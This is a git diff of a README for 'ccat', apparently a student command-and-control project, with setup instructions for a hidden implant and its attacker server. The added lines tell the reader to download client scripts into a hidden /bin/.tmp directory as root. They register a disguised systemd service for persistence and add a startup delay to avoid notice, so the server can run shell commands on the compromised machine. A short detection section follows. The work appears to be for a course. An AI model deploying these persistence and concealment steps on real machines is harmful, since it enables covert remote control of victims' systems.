@@ -1,20 +1,49 @@
 # C2 Project Submission
 ## Installation
-First, install pip using the instructions [here](https://pip.pypa.io/en/stable/installation/#get-pip-py).
-
-Install the pycryptodome package using pip and download the relevant repo code.
+### Client (Compromised)
 On the client (compromised week 4) machine, run the following as root:
-
 ```shell
+# Install pip
+curl -L https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
+python get-pip.py
+# Install necessary packages
 pip install pycryptodome
+# Save scripts in hidden directory
 cd /bin && mkdir .tmp && cd .tmp
 curl -L https://github.com/tararoshan/ccat/raw/main/python-version/configuration.py -o configuration.py
 curl -L https://github.com/tararoshan/ccat/raw/main/python-version/client.py -o client.py
+echo "python /bin/.tmp/client.py" > ccat.sh
+# Add to bootup
+vi /etc/systemd/system/ccat.service
+```
+in the vi editor, paste the following:
+```
+[Unit]
+Description=Definitely not ccat malware
+
+Wants=network.target
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/bin/.tmp/ccat.sh
+Restart=on-failure
+RestartSec=30
+KillMode=process
+```
+and then in the shell again, run
+```shell
+chmod 640 /etc/systemd/system/ccat.service
+sudo systemctl daemon-reload  # You can use user/pass gg for root
+sudo systemctl enable ccat  # Have ccat service run at launch!
 ```
 
+### Server (Attacker)
 And likewise, run the following on the attacking machine:
 ```shell
+# Install necessary packages
 pip install pycryptodome
+# Save scripts
 curl -L https://github.com/tararoshan/ccat/raw/main/python-version/configuration.py -o configuration.py
 curl -L https://github.com/tararoshan/ccat/raw/main/python-version/server.py -o server.py
 ```
@@ -25,6 +54,9 @@ and then run the client process (`python client.py`) on the compromised machine,
 or just reboot it after the installation process. To change configuration
 options like your IP address, see the first two lines of `configuration.py` and
 make sure you change this in both the *client and server* copies! :)
+
+Alternatively, after setting up configuations, you can just run
+`sudo systemctl start ccat`.
 
 One way of figuring out the server's IP is by running `curl https://ipinfo.io/ip`
 from the attacking (server) machine (unless you're just running it as the hostOS,
@@ -47,7 +79,8 @@ sent from the server as shell commands.
 
 ### Persist across reboots
 ccat is safed to disk, so it'll remain after reboots. It's added to `systmctl`
-to run during startup, as well. So it'll run after the system boots up again.
+to run during startup, as well (see client installation instructions). So it'll
+run after the system boots up again.
 
 ### Configuration for where to get commands
 See configuration.py.
@@ -71,20 +104,27 @@ have a hardcoded password to look for to grant access to the server.
 By saving the code in a directory starting with ".", users won't see the
 directory in a GUI or with `ls` (unless they run it with the `-a` flag).
 
+I also have the client script sleep for ten seconds before running so that
+there's no immediate effect that the user could look for (if this is annoying
+when grading, comment out the line with "UNCOMMENT IF THIS TAKES TOO LONG WHILE
+GRADING" next to it in client.py).
+
 I initially tried to do this with process injection (you can look at my GitHub
 commits for proof), but I found that using Cython to get a C version of the
 python code and then trying to link it myself was too difficult. I was so close,
 if not for that darned .so shared object file. :(
 
-## Detecting ccat
+## Extra Credit: Detecting ccat
 ```shell
-ps | grep "ccat"
+ps -U root -u root u | grep client.py
 ```
-If this prints something, ccat is running! If not, you're safe.
+If this prints something (other than the grep process), ccat is running! If not,
+you're safe.
 
 Some other ideas include
 1. Looking at network traffic with Wireshark
-2. Recursively searching the entire filesystem for ccat (via `find -R ccat` or something)
+2. Recursively searching the entire filesystem for ccat (via `find -R client.py` or something)
+3. Look at the system journal via `journalctl`
 
 ## Resources & Credit
 I used [this](https://medium.com/@songchai.d01/how-to-create-a-reverse-shell-in-python-41fe75d88521)
